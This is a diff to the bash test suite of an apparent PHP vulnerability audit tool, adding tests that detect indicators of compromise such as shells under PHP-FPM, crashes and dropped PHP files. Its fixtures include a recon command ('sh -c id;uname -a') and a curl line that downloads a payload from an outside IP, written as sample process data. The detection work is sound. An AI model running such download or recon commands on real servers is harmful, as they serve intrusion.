@@ -156,6 +156,36 @@ printf '%s\n' '7f00a000-7f00b000 r-xp 00000000 08:01 1234 /usr/lib/x86_64-linux-
 printf '#!/bin/sh\necho "PHP 8.3.30 (fpm-fcgi) (built: Oct  1 2026)"\n' >"$RA/root/opt/cpanel/ea-php83/root/usr/sbin/php-fpm"
 printf '#!/bin/sh\necho "PHP 8.2.29 (fpm-fcgi) (built: Sep  3 2026)"\n' >"$RA/root/opt/plesk/php/8.2/sbin/php-fpm"
 chmod +x "$RA/root/opt/cpanel/ea-php83/root/usr/sbin/php-fpm" "$RA/root/opt/plesk/php/8.2/sbin/php-fpm"
+# Indicators of compromise on web-m (web-rb): sh under a PHP-FPM worker, crashes in each log after the window
+# (one of each before it), PHP files changed after it (one before). web-rc has kernel segfaults only.
+derive web-rb ps.txt '1 0 systemd /sbin/init'
+RB=$WORK/hosts/web-rb
+printf '%s\n' '400 1 php-fpm8.3 php-fpm: master process (/etc/php/8.3/fpm/php-fpm.conf)' '401 400 php-fpm8.3 php-fpm: pool www' \
+  '402 401 sh sh -c id;uname -a' '403 1 cron /usr/sbin/cron -f' '404 403 sh /bin/sh -c run-parts /etc/cron.daily' >>"$RB/ps.txt"
+printf '%s\n' '2026-10-10T03:00:00+0000 web-rb kernel: php-fpm8.3[401]: segfault at 0 ip 0000 sp 0000 error 4 in libc.so.6' \
+  '2026-10-20T03:00:00+0000 web-rb kernel: php-fpm8.3[401]: segfault at 0 ip 0000 sp 0000 error 4 in php-fpm8.3' \
+  '2026-10-22T04:00:00+0000 web-rb kernel: apache2[77]: segfault at 0 ip 0000 sp 0000 error 6 in libphp8.3.so' >"$RB/kernel.log"
+mkdir -p "$RB/root/var/log/apache2" "$RB/root/var/log/nginx" "$RB/root/tmp" "$RB/root/var/www/shop/wp-content/uploads"
+printf '%s\n' '[15-Oct-2026 10:00:00] WARNING: [pool www] child 390 exited on signal 11 (SIGSEGV - core dumped) after 1.0 seconds from start' \
+  '[19-Oct-2026 10:00:00] WARNING: [pool www] child 401 exited on signal 11 (SIGSEGV - core dumped) after 1.0 seconds from start' \
+  '[23-Oct-2026 12:30:00] WARNING: [pool www] child 402 exited on signal 11 (SIGSEGV - core dumped) after 2.0 seconds from start' \
+  >"$RB/root/var/log/php8.3-fpm.log"
+printf '%s\n' '[Tue Oct 20 10:00:00.123456 2026] [core:notice] [pid 1:tid 2] AH00052: child pid 5 exit signal Segmentation fault (11)' \
+  >"$RB/root/var/log/apache2/error.log"
+printf '%s\n' '2026/10/21 11:00:00 [error] 12#12: *1 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in Unknown on line 0"' \
+  >"$RB/root/var/log/nginx/error.log"
+printf 'server {\n    server_name shop.example.com;\n    root /var/www/shop;\n    location ~ \\.php$ { fastcgi_pass unix:/run/php/php8.3-fpm.sock; }\n}\n' \
+  >"$RB/root/etc/nginx/sites-enabled/shop"
+: >"$RB/root/tmp/x.php"; touch -d 2026-10-20T08:00:00 "$RB/root/tmp/x.php"
+: >"$RB/root/tmp/old.php"; touch -d 2026-10-01T08:00:00 "$RB/root/tmp/old.php"
+: >"$RB/root/var/www/shop/wp-content/uploads/a.phtml"; touch -d 2026-10-22T09:15:00 "$RB/root/var/www/shop/wp-content/uploads/a.phtml"
+: >"$RB/root/var/www/shop/index.html"
+derive web-rc kernel.log '2026-10-20T03:00:00+0000 web-rc kernel: php-fpm8.3[401]: segfault at 0 ip 0000 sp 0000 error 4 in php-fpm8.3'
+# Each way to "investigate" on its own: a shell under PHP only (web-rd), crashes plus a new PHP file (web-re).
+derive web-rd ps.txt "$(printf '%s\n' '401 1 php-fpm8.3 php-fpm: pool www' '402 401 curl curl -o /tmp/x http://198.51.100.7/x')"
+derive web-re kernel.log '2026-10-20T03:00:00+0000 web-re kernel: php-fpm8.3[401]: segfault at 0 ip 0000 sp 0000 error 4 in php-fpm8.3'
+mkdir -p "$WORK/hosts/web-re/root/dev/shm"; : >"$WORK/hosts/web-re/root/dev/shm/.s.php"
+touch -d 2026-10-20T03:01:00 "$WORK/hosts/web-re/root/dev/shm/.s.php"
 derive web-pd root/var/lib/php2shell/policy-rc.d.kept "$OWNRCD"   # a run killed (SIGKILL) mid-install left ours
 OURRCD=$'#!/bin/sh\n# php2shell-fixer: no service actions during the patch install; removed after it\nexit 101'
 mkdir -p "$WORK/hosts/web-pd/root/usr/sbin" && printf '%s\n' "$OURRCD" >"$WORK/hosts/web-pd/root/usr/sbin/policy-rc.d"
@@ -603,7 +633,9 @@ listen=$(awk "{print \$4}" <<<"$line")
 mark=$P2S_STUB/.curl-${key//[\/:]/_}
 if [ -e "$mark" ]; then awk "{printf \"%s\", \$3}" <<<"$line"
 else : >"$mark"; awk "{printf \"%s\", \$2}" <<<"$line"; fi'
-stub journalctl 'u=${2%.service}
+# journalctl -k: the host's kernel.log, if any; otherwise the excerpt of a unit that failed to start.
+stub journalctl 'if [ "$1" = -k ]; then cat "$P2S_STUB/kernel.log" 2>/dev/null; exit 0; fi
+u=${2%.service}
 echo "systemd[1]: $u.service: Main process exited, code=exited, status=78/CONFIG"
 echo "systemd[1]: Failed to start $u.service - The PHP FastCGI Process Manager."'
 # SAPI binaries: the effective upload_progress comes from the fake root's ini files, last assignment wins
@@ -685,7 +717,7 @@ export TMPDIR=$WORK/hosttmp
 mkdir -p "$TMPDIR"
 
 # Calls an audit may make; anything else in the stub log is a write or a package operation.
-READ_ONLY='^(ssh (-o [^ ]+ )*[^ ]+ bash -s|hostname ?|apachectl -t -D DUMP_INCLUDES|dpkg-query .*|systemctl is-active [^ ]+|systemctl show -p ActiveEnterTimestamp --value [^ ]+|dpkg --compare-versions .*|dpkg -S [^ ]+|ps -eo [^ ]+|apt-cache madison [^ ]+|apt-cache policy [^ ]+|apt-get download -q [^ ]+|dpkg-deb --fsys-tarfile [^ ]+|php-(fpm|cgi)[0-9.]+ -i|php[0-9.]+ -c [^ ]+ -i|apt-mark showhold|apt-config dump|nginx -T|apt-helper .* download-file [^ ]+ [^ ]+)$'
+READ_ONLY='^(ssh (-o [^ ]+ )*[^ ]+ bash -s|hostname ?|apachectl -t -D DUMP_INCLUDES|dpkg-query .*|systemctl is-active [^ ]+|systemctl show -p ActiveEnterTimestamp --value [^ ]+|dpkg --compare-versions .*|dpkg -S [^ ]+|ps -eo [^ ]+|journalctl -k .*|apt-cache madison [^ ]+|apt-cache policy [^ ]+|apt-get download -q [^ ]+|dpkg-deb --fsys-tarfile [^ ]+|php-(fpm|cgi)[0-9.]+ -i|php[0-9.]+ -c [^ ]+ -i|apt-mark showhold|apt-config dump|nginx -T|apt-helper .* download-file [^ ]+ [^ ]+)$'
 fingerprint() { (cd "$WORK/hosts" && find . -type f -exec md5sum {} + | sort); }
 
 echo "▸ verdict (installed build)"
@@ -1241,6 +1273,41 @@ has "$RAF" "PHP outside dpkg left alone: /usr/local/lib/libphp8.2.so (apache2, r
 hasnt "$RAF" "ea-php83=" "web-ra: fix installs nothing for cPanel's PHP"
 MA=$(bash "$S/run.sh" audit web-m)
 eq "$(grep -c 'kind=foreign_php' <<<"$MA")" 0 "web-m (dpkg PHP only): no foreign_php record"
+
+echo "▸ indicators of compromise"
+RBA=$(bash "$S/run.sh" audit web-rb)
+has "$RBA" "kind=ioc host=web-rb type=shell_child source=php-fpm8.3 count=1 first=- last=- pid=402 command=sh%20-c%20id;uname%20-a" \
+  "web-rb: sh under a PHP-FPM worker"
+eq "$(grep -c 'type=shell_child' <<<"$RBA")" 1 "web-rb: a shell under cron is not counted"
+has "$RBA" "kind=ioc host=web-rb type=crash source=kernel count=2 first=2026-10-20T03:00:00 last=2026-10-22T04:00:00" \
+  "web-rb: kernel segfaults of php-fpm and apache2 since the window, the one before it left out"
+has "$RBA" "kind=ioc host=web-rb type=crash source=php-fpm count=2 first=2026-10-19T10:00:00 last=2026-10-23T12:30:00" \
+  "web-rb: PHP-FPM signal 11 since the window (PHP-FPM's date format)"
+has "$RBA" "kind=ioc host=web-rb type=crash source=apache count=1 first=2026-10-20T10:00:00 last=2026-10-20T10:00:00" \
+  "web-rb: Apache AH00052 (Apache's date format)"
+has "$RBA" "kind=ioc host=web-rb type=crash source=php-fatal count=1 first=2026-10-21T11:00:00 last=2026-10-21T11:00:00" \
+  "web-rb: the OOM fatal in nginx's error log (nginx's date format)"
+has "$RBA" "kind=ioc host=web-rb type=new_php source=/tmp count=1 first=2026-10-20T08:00:00 last=2026-10-20T08:00:00 capped=no" \
+  "web-rb: a .php in /tmp after the window; the older one not counted"
+has "$RBA" "kind=ioc host=web-rb type=new_php source=/var/www/shop count=1 first=2026-10-22T09:15:00 last=2026-10-22T09:15:00 capped=no" \
+  "web-rb: a .phtml under the nginx root; the .html not counted"
+has "$RBA" "kind=ioc_file host=web-rb mtime=2026-10-22T09:15:00 path=/var/www/shop/wp-content/uploads/a.phtml" "web-rb: newest file listed"
+eq "$(bash "$S/next.sh" "$(sed -n 's/^log: //p' <<<"$RBA")" | cut -d' ' -f2)" "investigate" "web-rb: next step investigate, ahead of fix"
+RBR=$(bash "$S/report.sh" "$(sed -n 's/^log: //p' <<<"$RBA")")
+has "$RBR" "### Indicators of compromise" "report: Indicators section"
+has "$RBR" '| **shell under PHP** | php-fpm8.3, pid 402 | 1 | `sh -c id;uname -a` | |' "report: the shell under PHP"
+: >"$RB/root/tmp/y.php"; touch -d 2026-10-24T08:00:00 "$RB/root/tmp/y.php"
+RBK=$(P2S_IOC_FILE_CAP=1 bash "$S/run.sh" audit web-rb)
+has "$RBK" "kind=ioc host=web-rb type=new_php source=/tmp count=1" "web-rb capped at 1: one file counted"
+has "$RBK" "capped=yes" "web-rb capped at 1: capped=yes"
+RCA=$(bash "$S/run.sh" audit web-rc)
+has "$RCA" "kind=ioc host=web-rc type=crash source=kernel count=1" "web-rc: crash recorded"
+eq "$(bash "$S/next.sh" "$(sed -n 's/^log: //p' <<<"$RCA")" | cut -d' ' -f2)" "fix" "web-rc: crashes alone do not make it investigate"
+eq "$(grep -c 'kind=ioc' <<<"$MA")" 0 "web-m (clean): no ioc records"
+eq "$(bash "$S/next.sh" "$(bash "$S/run.sh" audit web-rd | sed -n 's/^log: //p')" | cut -d' ' -f2)" "investigate" \
+  "web-rd: a downloader under PHP alone -> investigate"
+eq "$(bash "$S/next.sh" "$(bash "$S/run.sh" audit web-re | sed -n 's/^log: //p')" | cut -d' ' -f2)" "investigate" \
+  "web-re: a crash plus a new PHP file in /dev/shm -> investigate"
 
 echo "▸ fix"
 state() { echo "$WORK/hosts/$1/root/var/lib/php2shell"; }
@@ -2053,6 +2120,7 @@ eq "$NV" "web-v: ensure - last ensure: exit-3, not mitigated: 8.3/apache2:overri
   "next: an Apache override is named as one, with file and line"
 bash "$S/next.sh" >/dev/null 2>&1; code=$?
 eq "$code" 2 "next: no arguments -> exit 2"
+eq "$(bash "$S/next.sh" 2>&1 | head -1 | cut -c1-23)" "Usage: next.sh --latest" "next: no arguments -> its usage, not the header"
 
 echo "▸ report"
 rm -rf "$WORK/hosts"   # the report must work from saved logs alone
